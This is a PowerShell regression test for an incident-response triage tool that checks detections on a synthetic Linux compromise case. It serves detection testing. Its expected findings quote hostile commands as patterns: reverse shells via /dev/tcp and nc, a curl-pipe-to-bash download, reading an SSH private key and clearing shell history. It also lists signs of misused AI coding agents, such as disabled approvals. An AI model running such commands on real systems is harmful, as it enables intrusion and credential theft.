<#
.SYNOPSIS
  Regression test for UAC collections: builds the synthetic UAC case, runs
  CsirtTriage headless and checks the case layout, the per-collection checks
  (extract, skip, replace) and the expected detections.

.DESCRIPTION
  Uses tools\New-UacTestCase.ps1. Run it after changing a UAC parser or the
  shared output. Exit code 1 when a check fails.

.EXAMPLE
  dotnet build; .\tools\Test-UacDetections.ps1 -Exe src\CsirtTriage.Cli\bin\Debug\net8.0\csirttriage.dll
#>
param(
    [Parameter(Mandatory)] [string] $Exe,
    [string] $WorkFolder = (Join-Path ([IO.Path]::GetTempPath()) 'UacRegression')
)
$ErrorActionPreference = 'Stop'
if (-not (Test-Path $Exe)) { throw "Build first: $Exe not found." }

# Only ever delete a folder this script created
$marker = Join-Path $WorkFolder '.uac-regression'
if (Test-Path $WorkFolder) {
    if (-not (Test-Path $marker)) { throw "$WorkFolder exists and was not created by this script; choose another -WorkFolder." }
    Remove-Item -LiteralPath $WorkFolder -Recurse -Force
}
& (Join-Path $PSScriptRoot 'New-UacTestCase.ps1') -Path $WorkFolder | Out-Null
Set-Content -Path $marker -Value 'created by Test-UacDetections.ps1'
Copy-Item (Join-Path $PSScriptRoot 'example-iocs.txt') (Join-Path $WorkFolder 'iocs.txt')

# A .dll (the cross-platform CLI) runs through dotnet; an .exe runs directly
$runArgs = @('--case', $WorkFolder, '--name', 'Regression', '--uac-only')
if ($Exe -like '*.dll') { $file = 'dotnet'; $runArgs = @($Exe) + $runArgs } else { $file = $Exe }
$log = Join-Path $WorkFolder 'run.log'
$p = Start-Process -FilePath $file -ArgumentList $runArgs -Wait -PassThru -NoNewWindow -RedirectStandardOutput $log
# Exit code 3: some collections failed, expected here (the corrupt archive)
if ($p.ExitCode -ne 3) { throw "CsirtTriage exited with $($p.ExitCode), expected 3 (one failed collection); see $log" }

$level2 = Join-Path $WorkFolder 'Level2'
$processed = Join-Path $WorkFolder 'Processed'
$decomp = Join-Path $WorkFolder 'Decompressed'
$runLog = Get-Content $log -Raw -Encoding UTF8

$failed = 0
function Check([bool] $ok, [string] $what) {
    if ($ok) { Write-Host "  PASS  $what" } else { Write-Host "  FAIL  $what" -ForegroundColor Red; $script:failed++ }
}
function Findings([string] $collection) {
    $f = Join-Path (Join-Path $level2 $collection) 'Findings.csv'
    if (Test-Path $f) { @(Import-Csv $f -Encoding UTF8) } else { @() }
}
function Has([string] $collection, [string] $severity, [string] $source, [string] $pattern) {
    $hit = @(Findings $collection | Where-Object { $_.Severity -eq $severity -and $_.Source -eq $source -and $_.Text -match $pattern })
    Check ($hit.Count -gt 0) "$collection $severity [$source] $pattern"
}

$web = 'uac-web01-linux-20261101'; $db = 'uac-db01-linux-20261102'; $app = 'uac-app01-linux-20261103'
$mail = 'uac-mail01-linux-20261104'; $fil = 'uac-file01-linux-20261105'

Write-Host 'Extraction and per-collection checks'
Check (Test-Path (Join-Path $decomp $web)) 'web01 extracted from Uploads\'
Check (-not (Get-ChildItem $decomp -Directory -Filter '_partial_*')) 'no _partial_ folders left'
Check (-not (Get-ChildItem $decomp -Directory -Filter 'uac-broken*')) 'corrupt archive leaves no folder'
Check ($runLog -match '\[ERROR\] \[uac-broken-linux-20261106\]') 'corrupt archive reported'
Check ($runLog -match 'Run finished: 4 analysed, 1 failed') 'four analysed, one failed, mail01 not re-run'
Check ((Get-Content (Join-Path (Join-Path $level2 $mail) 'Findings.csv') -Raw) -match 'Pre-existing output') 'mail01 already analysed: left untouched'
Check (-not (Select-String -Path (Join-Path (Join-Path $processed $fil) '*.csv') -Pattern 'STALE-ROW' -Quiet)) 'file01 stale Processed\ rows replaced'
Check (-not (Select-String -Path (Join-Path (Join-Path $level2 $fil) 'Findings.csv') -Pattern 'STALE-ROW' -Quiet)) 'file01 stale Level2\ rows replaced'

Write-Host 'Layout'
foreach ($c in $web, $db, $app, $fil) {
    $out = Join-Path $level2 $c
    Check ((Test-Path (Join-Path $out '.processed')) -and (Test-Path (Join-Path $out 'QuickWins.rtf')) -and
           (Test-Path (Join-Path $out 'Findings.csv')) -and (Test-Path (Join-Path $out 'host.txt'))) "$c analysed into Level2\"
    Check ((Get-ChildItem (Join-Path $processed $c) -Filter 'Normalized_*.csv').Count -ge 5) "$c normalised CSVs in Processed\"
    Check (-not (Get-ChildItem $out -Filter 'Normalized_*.csv')) "$c no normalised CSVs in Level2\"
    Check (-not (Test-Path (Join-Path $out 'QuickWins.txt'))) "$c no QuickWins.txt"
}
Check (-not (Get-ChildItem $processed -Recurse -Filter 'Findings.csv')) 'no analysis results in Processed\'
Check ((Get-Content (Join-Path (Join-Path $level2 $web) 'host.txt') -Raw) -match 'Kind=UAC') 'host.txt records the collection type'

Write-Host 'web01 detections'
Has $web 'CRITICAL' 'AUTH' 'Brute force succeeded: root logged in from 203\.0\.113\.45'
Has $web 'HIGH' 'AUTH' 'Account created: support'
Has $web 'CRITICAL' 'WEB' 'Webshell command from 203\.0\.113\.45'
Has $web 'CRITICAL' 'WEB' 'Web login brute force succeeded'
Has $web 'HIGH' 'WEB' 'SQL injection from 203\.0\.113\.99 via sqlmap'
Has $web 'CRITICAL' 'JOURNAL' 'bash -i >& /dev/tcp/203\.0\.113\.45/4444'
Has $web 'HIGH' 'SYSLOG' 'curl -s http://203\.0\.113\.45/x\.sh \| bash'
Has $web 'HIGH' 'CRONTAB' "schedule=@reboot CMD: /bin/bash -c 'bash -i"
Has $web 'HIGH' 'CRONTAB' 'nc 203\.0\.113\.45 4444 -e /bin/sh'
Has $web 'HIGH' 'BODYFILE' 'Hidden executable in temp dir: /tmp/\.x\.sh'
Has $web 'HIGH' 'LIVE_RESPONSE' 'Established connection from flagged process'
Has $web 'HIGH' 'BASH' 'NOPASSWD:ALL'
Has $web 'HIGH' 'BASH' 'history -c'
Has $web 'HIGH' 'HASHES' 'hash lookup: /tmp/\.x\.sh sha1=da39a3ee5e6b4b0d3255bfef95601890afd80709'
Has $web 'HIGH' 'HASHES' 'hash lookup: /dev/shm/\.kworker'
Has $web 'MEDIUM' 'HASHES' 'hash lookup: /home/dev/tools/scan\.py'
$cand = @(Import-Csv (Join-Path (Join-Path $level2 $web) 'Sha1Candidates.csv'))
Check ($cand.Count -eq 3) "web01 Sha1Candidates.csv: 3 candidates, /usr/bin/ls whitelisted, /opt/app/bin/server below threshold (got $($cand.Count))"

Write-Host 'db01 AI coding agents'
Has $db 'HIGH' 'AIAGENT' 'approvals disabled \(bypassPermissions\)'
Has $db 'HIGH' 'AIAGENT' 'cat /home/dev/\.ssh/id_rsa'
Has $db 'HIGH' 'AIAGENT' 'prompt-injection phrase'
Has $db 'HIGH' 'AIAGENT' "MCP server 'tunnel'"
Has $db 'HIGH' 'AIAGENT' 'defaultApprovalMode = yolo'

Write-Host 'file01 live response'
Has $fil 'CRITICAL' 'LIVE_RESPONSE' '/etc/ld\.so\.preload is not empty'
Has $fil 'HIGH' 'LIVE_RESPONSE' "Account 'sysbackup' has UID 0"
Has $fil 'HIGH' 'LIVE_RESPONSE' 'Process running from a deleted binary'

Write-Host 'Shared outputs'
$logons = @(Import-Csv (Join-Path (Join-Path $level2 $web) 'Logons.csv'))
Check (@($logons | Where-Object { $_.User -eq 'root' -and $_.SourceIp -eq '203.0.113.45' -and $_.LogonType -eq 'SSH' }).Count -eq 1) 'web01 SSH logon in Logons.csv'
$hits = @(Import-Csv (Join-Path (Join-Path $level2 $web) 'IocHits.csv'))
Check ($hits.Count -eq 10) "web01 case IOC hits = 10 (got $($hits.Count))"
Check (@($hits | Where-Object { $_.Type -eq 'SHA1' -and $_.Sources -match 'HASHES' }).Count -eq 1) 'case SHA1 found in hash_executables.sha1'
Check (@($hits | Where-Object { $_.Type -eq 'CIDR' -and $_.Ioc -eq '198.51.100.0/24' }).Count -eq 1) 'CIDR IOC matched'
Check ((Get-Content (Join-Path (Join-Path $level2 $web) '.quickwins.txt') -Raw) -match 'CASE IOC HITS') 'IOC block in the QuickWins source'

Write-Host 'Case'
$summary = Get-Content (Join-Path $level2 'CaseSummary.txt') -Raw -Encoding UTF8
$arrow = [string][char]0x2192
# mail01 is pre-seeded as already analysed (no host.txt), so links to and from it are not expected
foreach ($pair in @('web01', 'db01'), @('db01', 'app01'), @('file01', 'web01')) {
    Check ($summary -match "$($pair[0])\s+$arrow\s+$($pair[1])\b") "lateral $($pair[0]) -> $($pair[1]) (scp)"
}
Check ($summary -match '203\.0\.113\.45\s+EXTERNAL') 'external source logging on to several hosts'
Check (Test-Path (Join-Path $level2 'CaseFindings.csv')) 'CaseFindings.csv written'
Check (Test-Path (Join-Path $level2 'iocs_discovered.txt')) 'iocs_discovered.txt written'

if ($failed -gt 0) { Write-Host "$failed check(s) failed." -ForegroundColor Red; exit 1 }
Write-Host 'All checks passed.'
